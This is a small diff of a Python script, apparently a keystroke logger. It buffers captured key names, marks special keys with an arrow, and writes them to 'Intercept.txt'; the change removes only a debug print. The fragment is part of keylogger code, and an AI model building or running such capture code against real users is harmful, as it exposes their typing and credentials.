@@ -35,8 +35,6 @@ with open("Intercept.txt", "w", encoding="utf-8") as file:
         except AttributeError:
             write_String += "\u2191{0}".format(key)
 
-        print(len(write_String))
-
         if len(write_String) > 30:
             file.write(write_String)
             file.write("\n")
